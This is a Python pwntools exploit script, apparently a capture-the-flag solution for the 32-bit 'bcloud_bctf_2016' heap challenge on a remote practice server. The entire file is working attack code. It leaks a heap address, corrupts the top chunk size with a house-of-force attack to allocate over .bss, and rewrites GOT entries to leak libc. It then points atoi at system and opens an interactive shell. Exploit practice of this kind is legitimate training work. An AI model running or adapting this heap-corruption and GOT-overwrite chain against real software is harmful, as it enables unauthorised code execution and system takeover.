from pwn import *


ld_path = "/home/fanxinli/libc-so/libc-23-32/ld-2.23.so"
libc_path = "/home/fanxinli/libc-so/libc-2.23-32.so"
# p = process([ld_path, "./bcloud_bctf_2016"], env={"LD_PRELOAD":libc_path})
# p = process([ld_path, ""])
# p = process("", env={"LD_PRELOAD":libc_path})
# p = process("")
p = remote("node4.buuoj.cn", 29996)

# context.log_level = "debug"

r = lambda : p.recv()
rx = lambda x: p.recv(x)
ru = lambda x: p.recvuntil(x)
rud = lambda x: p.recvuntil(x, drop=True)
s = lambda x: p.send(x)
sl = lambda x: p.sendline(x)
sa = lambda x, y: p.sendafter(x, y)
sla = lambda x, y: p.sendlineafter(x, y)
shell = lambda : p.interactive()


def new(size, con):
    sla("option--->>\n", "1")
    sla("content:\n", str(size))
    sla("Input the content:\n", con)

def show():
    sla("option--->>\n", "2")

def edit(index, con):
    sla("option--->>\n", "3")
    sla("Input the id:\n", str(index))
    sla("Input the new content:\n", con)

def free(index):
    sla("option--->>\n", "4")
    sla("Input the id:\n", str(index))

def change_mark():
    sla("option--->>\n", "5")


# strcpy --> house of force 


# leak heap addr
name = cyclic(0x40)
org = cyclic(0x40)
host = cyclic(0x40)
sa("Input your name:\n", name)
rud("paaa")
info = u32(rud("!").ljust(0x4, b"\x00"))
print("heap addr: ", hex(info))

# alter top chunk size --> 0xffffffff
org = cyclic(0x40)
host = p32(0xffffffff)
sa("Org:\n", org)
sla("Host:\n", host)

# alloc to bss 
bss = 0x0804B0A0
top_chunk = info+0xd0
size = bss-top_chunk-2*0x8

pro = ELF("./bcloud_bctf_2016")
free_g = pro.got["free"]
puts_p = pro.plt["puts"]
atoi_g = pro.got["atoi"]

new(size, "a")  # next malloc will be bss
pad = p32(0x8)*3
pad = pad.ljust(0x80, b"\x00")
pad += p32(free_g)+p32(atoi_g)*2
new(0x90, pad)

# alter free_got to puts_plt --> leak libc
edit(0, p32(puts_p))
free(1)
info = u32(ru("\xf7")[-4:])
print("leak libc: ", hex(info))

# count
libc = ELF(libc_path)
base = info-libc.sym["atoi"]
print("base: ", hex(base))
system = base+libc.sym["system"]

# alter atoi_got to system
edit(2, p32(system))

# attack
sla("option--->>\n", "/bin/sh\x00")

shell()


